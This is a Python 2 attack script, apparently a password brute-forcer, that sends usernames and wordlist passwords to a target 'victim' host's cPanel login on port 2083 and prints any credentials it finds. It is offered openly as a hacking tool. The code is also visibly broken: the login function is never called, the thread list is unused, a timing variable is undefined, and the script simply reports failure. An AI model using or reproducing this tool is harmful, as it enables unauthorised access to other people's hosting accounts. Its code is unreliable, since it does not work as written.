#!usr/bin/env python

import argparse
import urllib,urllib2
import re, time
import cookielib
import sys, os
import threading
import socket


def cls():

	if os.name == "nt":
		os.system('cls')
	else:
		os.system('clear')

cls()

logo = """
**
**
**         _________         ___      ___
**        |   ____  \       /   \    /   \ 
**        |  |    \  |      |    \  /    |
**        |  |____/  |      |  |\ \/  /| |   
**        |   __    /       |  | \___/ | |
**        |  |  \  \        |  |       | |
**        |__|   \__\   o   |__|       |_|
**
**               Rajesh Majumdar
** Tweet at : @rajeshmjmdrhack
**
**
\t\t Coded by Rajesh Majumdar
"""

print logo

if __name__=="__main__":
	if len(sys.argv) == 1:
		print ''' usage : bruteforcer.py [-h] [--host HOST] [--user USER] [--password PASSWORD]

optional arguments:
	-h , --help                     Print this help message.
	--host HOST                     Enter the targeted victims IP address.
	--user USER                     Insert username.
	--password PASSWORD             Insert password list.'''
		sys.exit()

	parser=argparse.ArgumentParser()
	parser.add_argument('--host', help="Enter targeted victims IP address")
	parser.add_argument('--user', help="Insert username")
	parser.add_argument('--password', help="Insert Password List")
	args = parser.parse_args()

if args.host.startswith("http://"):
	print "Insert URL without http://"
	print "Coded By Rajesh Majumdar"
	print ""
	sys.exit(1)

elif args.host.startswith("https://"):
	print "Insert URL without https://"
	print "Coded by Rajesh Majumdar"
	print ""
	sys.exit(1)

else:
	pass

def cPanel (passwd, pwd, coder):

	try:

		args.host = socket.gethostbyname(args.host)

		post = {}
		post['user'] = args.user
		post['pass'] = passwd

		cpURL ="https://"+args.host+":2083/login/?login_only=1"
		neo = urllib2.Request(cpURL, urllib.urlencode(post))
		cp = coder.open(neo).read()

		if 'redirect' in cp:
			t2 = time.time()
			print ""
			print "[+] Your domain : %s" % args.host
			print "[+] Username : %s" % args.user
			print "[+] Password : %s" % passwd
			print "[+] Time taken : %s" % str(t2-t1)
			print ""
			os._exit(1)

	except socket.gaierror:
		print ""
		print "Please Insert Valid IP / HostName "
		print ""
		os._exit(1)

	except Exception,e :
		pass

threads = []

with open(args.password, 'r') as f:
	pwd = f.read().splitlines()

cj = cookielib.CookieJar()
coder = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))



print ""
print "[-] Failed to find password."
print "[-] Choose a different Password List."
print "[-] Coded By Rajesh Majumdar"
print ""
